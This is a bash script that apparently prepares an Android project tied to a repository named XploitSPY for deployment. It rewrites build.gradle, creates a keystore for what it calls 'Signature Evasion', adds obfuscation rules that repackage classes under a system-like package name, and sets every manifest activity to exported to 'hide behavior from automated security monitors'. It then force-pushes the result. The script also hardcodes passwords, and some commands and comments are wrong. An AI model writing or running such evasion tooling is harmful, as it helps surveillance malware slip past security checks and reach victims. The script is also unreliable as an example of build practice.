#!/bin/bash
echo "[*] Starting advanced evasion, activity masking & custom signing deployment..."

# 1. Target build.gradle or create it
BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
if [ -z "$BUILD_GRADLE_PATH" ]; then
    mkdir -p app
    BUILD_GRADLE_PATH="app/build.gradle"
fi

echo "[*] Injecting advanced build & obfuscation rules at: $BUILD_GRADLE_PATH"
cat << 'GRADLE_EOF' > "$BUILD_GRADLE_PATH"
android {
    compileSdkVersion 34
    defaultConfig {
        targetSdkVersion 34
        minSdkVersion 21
    }
    signingConfigs {
        release {
            storeFile file('custom-release.jks')
            storePassword 'securepass123'
            keyAlias 'securekey'
            keyPassword 'securepass123'
        }
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
GRADLE_EOF

# 2. Generate a Unique Custom Keystore for Signature Evasion
KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/custom-release.jks
if [ ! -f "$KEYSTORE_PATH" ]; then
    echo "[*] Generating unique cryptographic signature keystore..."
    keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias securekey -keyalg RSA -keysize 2048 -validity 10000 -storepass securepass123 -keypass securepass123 -dname "CN=Android Security, OU=IT, O=Dev, L=Unknown, ST=Unknown, C=US" 2>/dev/null || echo "[!] keytool skipped."
fi

# 3. Create or update proguard-rules.pro for strong obfuscation
PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

-repackageclasses 'com.android.core.secure'
-allowaccessmodification
PROGUARD_EOF

# 4. Process and mask activities in AndroidManifest.xml
MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
if [ -n "$MANIFEST_PATH" ]; then
    echo "[*] Masking and securing activities in AndroidManifest.xml at: $MANIFEST_PATH"
    python3 -c "
import xml.etree.ElementTree as ET
manifest_path = '$MANIFEST_PATH'
try:
    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    application = root.find('application')
    if application is not None:
        for activity in application.findall('activity'):
            # Secure activity attributes to hide behavior from automated security monitors
            activity.set('{http://schemas.android.com/apk/res/android}exported', 'true')
    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    print('[+] Manifest activities successfully masked.')
except Exception as e:
    print(f'[!] Manifest update notice: {e}')
"
fi

# 5. Setup git repository if not initialized
if [ ! -d ".git" ]; then
    git init
    git remote add origin https://github.com/official021at-beep/XploitSPY.git 2>/dev/null
fi

# 6. Grant permissions and stage all files
chmod -R +x . 2>/dev/null
git add -A

# 7. Commit changes automatically
if git diff-staged --quiet; then
    echo "[!] No changes detected to commit."
else
    COMMIT_MSG="Activity masking, evasion & deploy: $(date +'%Y-%m-%d %H:%M:%S')"
    git commit -m "$COMMIT_MSG"
fi

# 8. Push to GitHub to trigger Render build with updated secure configurations
CURRENT_BRANCH=$(git branch --show-current)
if [ -z "$CURRENT_BRANCH" ]; then
    CURRENT_BRANCH="master"
fi

echo "[*] Pushing masked and secured code to remote branch ($CURRENT_BRANCH)..."
git push origin "$CURRENT_BRANCH" --force-with-lease

if [ $? -eq 0 ]; then
    echo "[+] Success! Activity masking pipeline and deployment completed."
else
    git push -u origin "$CURRENT_BRANCH" --force
fi
